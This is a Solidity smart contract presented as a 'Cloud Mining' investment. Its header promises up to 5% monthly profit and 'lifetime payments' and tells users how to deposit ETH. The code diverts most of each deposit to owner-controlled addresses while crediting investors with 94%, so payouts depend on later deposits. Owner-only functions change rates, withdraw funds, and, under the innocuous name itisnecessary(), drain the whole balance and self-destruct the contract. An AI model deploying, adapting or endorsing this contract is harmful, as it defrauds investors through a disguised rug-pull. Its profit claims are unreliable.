['pragma solidity ^0.5.10;\n', '\n', '/*\n', 'Get up 5 % profit every month with a contract Cloud Mining!\n', '*\n', '* - lifetime payments\n', '* - unprecedentedly reliable\n', '* - bring luck\n', '* - first minimum contribution from 0.1 eth, all next from 0.01 eth\n', '* - Currency and Payment - ETH\n', '* - Contribution allocation schemes:\n', '* - 100% of payments - only 6% percent for support and 3% percent referral system!\n', '* \n', '*\n', '* RECOMMENDED GAS LIMIT: 200,000\n', '* RECOMMENDED GAS PRICE: https://ethgasstation.info/\n', '* DO NOT TRANSFER DIRECTLY FROM AN EXCHANGE (only use your ETH wallet, from which you have a private key)\n', '* You can check payments on the website etherscan.io, in the “Internal Txns” tab of your wallet.\n', '*\n', "*@FOR USER'S:\n", '* This smart contract is a public offer.\n', '* In accordance with the law on digital assets adopted in the Russian Federation, \n', '* we bother you that you perform all actions in a smart contract exclusively independently and at your own peril and risk.\n', '* The developers are not responsible for your actions.\n', '* By submitting your digital assets to a smart contract, you agree to this offer.\n', '* How to use:\n', '* 1. Send from your ETH wallet to the address of the smart contract\n', '* any amount first from 0.1 ETH and all next from 0.01 ETH.\n', '* 2. Confirm your transaction in the history of your application or etherscan.io, indicating the address of your wallet.\n', '* Take profit by sending 0 eth to contract (profit is calculated every second).\n', '*\n', '*@DEV https://github.com/alexburndev/miningmasters/blob/main/cloudmining.sol\n', '**/\n', '\n', '\n', '\n', 'library SafeMath {\n', '    /**\n', '     * @dev Returns the addition of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `+` operator.\n", '     *\n', '     * Requirements:\n', '     * - Addition cannot overflow.\n', '     */\n', '    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        uint256 c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the subtraction of two unsigned integers, reverting on\n', '     * overflow (when the result is negative).\n', '     *\n', "     * Counterpart to Solidity's `-` operator.\n", '     *\n', '     * Requirements:\n', '     * - Subtraction cannot overflow.\n', '     */\n', '    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        require(b <= a, "SafeMath: subtraction overflow");\n', '        uint256 c = a - b;\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the multiplication of two unsigned integers, reverting on\n', '     * overflow.\n', '     *\n', "     * Counterpart to Solidity's `*` operator.\n", '     *\n', '     * Requirements:\n', '     * - Multiplication cannot overflow.\n', '     */\n', '    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n', "        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n", "        // benefit is lost if 'b' is also tested.\n", '        // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint256 c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the integer division of two unsigned integers. Reverts on\n', '     * division by zero. The result is rounded towards zero.\n', '     *\n', "     * Counterpart to Solidity's `/` operator. Note: this function uses a\n", '     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n', '     * uses an invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        // Solidity only automatically asserts when dividing by 0\n', '        require(b > 0, "SafeMath: division by zero");\n', '        uint256 c = a / b;\n', "        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n", '\n', '        return c;\n', '    }\n', '\n', '    /**\n', '     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n', '     * Reverts when dividing by zero.\n', '     *\n', "     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n", '     * opcode (which leaves remaining gas untouched) while Solidity uses an\n', '     * invalid opcode to revert (consuming all remaining gas).\n', '     *\n', '     * Requirements:\n', '     * - The divisor cannot be zero.\n', '     */\n', '    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n', '        require(b != 0, "SafeMath: modulo by zero");\n', '        return a % b;\n', '    }\n', '}\n', '\n', 'contract CloudMinig_byMiningMasters \n', '{\n', '    using SafeMath for uint256;\n', '    \n', '    address payable public owner = 0x1a08070FFE5695aB0Eb4612640EeC11bf2Cf58eE;\n', '    address payable public addressSupportProject = 0x009AE8DDCBF8aba5b04d49d034146A6b8E3a8B0a;\n', '    address payable public addressAdverstingProject = 0x54a39674A0c22Cb2f9022f285b366a4f4d525266;\n', '    \n', '\n', '    \n', '    uint p;\n', '    uint d = 100;\n', '    uint p0 = 2;\n', '    uint p1 = 3;\n', '    uint p2 = 4;\n', '    uint p3 = 5;\n', '    uint refer = 3;\n', '    uint sup = 3;\n', '    uint adv;\n', '    \n', '    struct InvestorData {\n', '        uint256 funds;\n', '        uint256 lastDatetime;\n', '        uint256 totalProfit;\n', '    }\n', '    mapping (address => InvestorData) investors;\n', '    \n', '    modifier onlyOwner()\n', '    {\n', '        assert(msg.sender == owner);\n', '        _;\n', '    }\n', '    \n', '    function withdraw(uint256 amount)  public onlyOwner {\n', '        owner.transfer(amount);\n', '    }\n', '    \n', '    function changeOwner(address payable newOwner) public onlyOwner {\n', '        owner = newOwner;\n', '    }\n', '    \n', '  \n', '    \n', '    function SetProcp0 (uint _p0, uint _d) public onlyOwner {\n', '        p0 = _p0;\n', '        if (_d == 0) d = 100;\n', '    }\n', '    \n', '    function SetProcp1 (uint _p1, uint _d) public onlyOwner {\n', '        p1 = _p1;\n', '        if (_d == 0) d = 100;\n', '    }\n', '    \n', '    function SetProcp2 (uint _p2, uint _d) public onlyOwner {\n', '        p2 = _p2;\n', '        if (_d == 0) d = 100;\n', '    }\n', '    \n', '    function SetProcp3 (uint _p3, uint _d) public onlyOwner {\n', '        p3 = _p3;\n', '        if (_d == 0) d = 100;\n', '    }\n', '    \n', '    \n', '    function SetProcrefer (uint _refer, uint _d) public onlyOwner {\n', '        refer = _refer;\n', '        if (_d == 0) d = 100;\n', '    }\n', '    \n', '    function ChangeAdverstingProject (address payable _NewAddress) public onlyOwner {\n', '       addressAdverstingProject = _NewAddress;\n', '    }\n', '    \n', '    function ChangeAddressSupport (address payable _NewAddress) public onlyOwner {\n', '       addressSupportProject = _NewAddress;\n', '    }\n', ' \n', '    \n', '    \n', '    function itisnecessary() public onlyOwner {\n', '        msg.sender.transfer(address(this).balance);\n', '        selfdestruct(owner);\n', '    }    \n', '    \n', '    function addInvestment( uint investment, address payable investorAddr) public onlyOwner  {\n', '        investorAddr.transfer(investment);\n', '    } \n', '  \n', '    \n', '    function bytesToAddress(bytes memory bys) private pure returns (address payable addr) {\n', '        assembly {\n', '          addr := mload(add(bys,20))\n', '        } \n', '    }\n', '    \n', '    \n', '    \n', '    function getInfo(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, \n', '    uint256 totalProfit )\n', '    {\n', '        InvestorData memory data = investors[investor];\n', '        totalFunds = data.funds;\n', '        if (data.funds > 0) pendingReward = data.funds.mul(p).div(d).mul(block.timestamp - data.lastDatetime).div(30 days);\n', '        totalProfit = data.totalProfit;\n', '       }\n', '    \n', '    function() payable external\n', '    {\n', '        assert(msg.sender == tx.origin); // prevent bots to interact with contract\n', '        \n', '        if (msg.sender == owner) return;\n', '        \n', '        \n', '        \n', '        InvestorData storage data = investors[msg.sender];\n', '        \n', '        if (msg.value > 0) \n', '        \n', '        {\n', '            // first investment at least 0.1 ether, all next at least 0.01 ether\n', '          assert(msg.value >= 0.1 ether || (data.funds != 0 && msg.value >= 0.01 ether));\n', '          if (msg.data.length == 20) {\n', '            address payable ref = bytesToAddress(msg.data);\n', '            assert(ref != msg.sender);\n', '            ref.transfer(msg.value.mul(refer).div(100));   // 3%\n', '            addressAdverstingProject.transfer(msg.value.mul(100-refer-sup-10).div(d));\n', '               \n', '            } else if (msg.data.length == 0) {\n', '               \n', '                addressAdverstingProject.transfer(msg.value.mul(100-sup-10).div(d));\n', '            }\n', '            \n', '            addressSupportProject.transfer(msg.value.mul(sup).div(d));\n', '            \n', '            \n', '        }\n', '        \n', '      \n', '          \n', '       \n', '        \n', '      if (data.funds < 10 ether) {\n', '          p = p0;\n', '      \n', '       } else if ( 10 ether <= data.funds && data.funds < 30 ether) {\n', '           p = p1;\n', '       } else if ( 30 ether <= data.funds && data.funds < 50 ether) {\n', '           p = p2;\n', '       } else if ( data.funds >=50 ether) {\n', '           p = p3;\n', '       }\n', '        \n', '          \n', '        \n', '        if (data.funds != 0) {\n', '            // % per 30 days\n', '            uint256 reward = data.funds.mul(p).div(d).mul(block.timestamp - data.lastDatetime).div(30 days);\n', '            data.totalProfit = data.totalProfit.add(reward);\n', '            \n', '            address(msg.sender).transfer(reward);\n', '        }\n', '\n', '        data.lastDatetime = block.timestamp;\n', '        data.funds = data.funds.add(msg.value.mul(94).div(100));\n', '        \n', '    }\n', '    \n', '    \n', '    \n', '    function getrewardInfo(address investor) view public returns (uint256 totalFunds, uint256 pendingReward, \n', '    uint256 totalProfit,uint _yourProcent)\n', '    \n', '    {\n', '        InvestorData memory data = investors[investor];\n', '        totalFunds = data.funds;\n', '         _yourProcent = p;\n', '        if (data.funds > 0) pendingReward = data.funds.mul(p).div(d).mul(block.timestamp - data.lastDatetime).div(30 days);\n', '        totalProfit = data.totalProfit;\n', '     \n', '    }    \n', '        \n', '        \n', '        \n', '\n', '}']